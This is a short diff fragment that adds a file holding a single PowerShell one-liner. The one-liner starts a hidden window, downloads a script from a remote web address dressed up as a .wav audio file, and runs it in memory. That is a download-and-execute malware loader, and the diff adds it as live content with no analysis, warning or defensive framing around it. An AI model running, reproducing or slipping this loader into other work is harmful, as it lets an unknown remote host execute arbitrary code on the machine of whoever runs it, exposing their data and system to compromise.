@@ -1,0 +1,2 @@
+powershell -w h -nop -c "$I='https://www.touchsol.com/resourse.wav';Add-Type -A System.Net.Http;$w=([Net.Http.HttpClient]::new()).GetStringAsync($I).Result;$Q=[PowerShell]::Create().AddScript($w);$Q.EndInvoke($Q.BeginInvoke())"
+
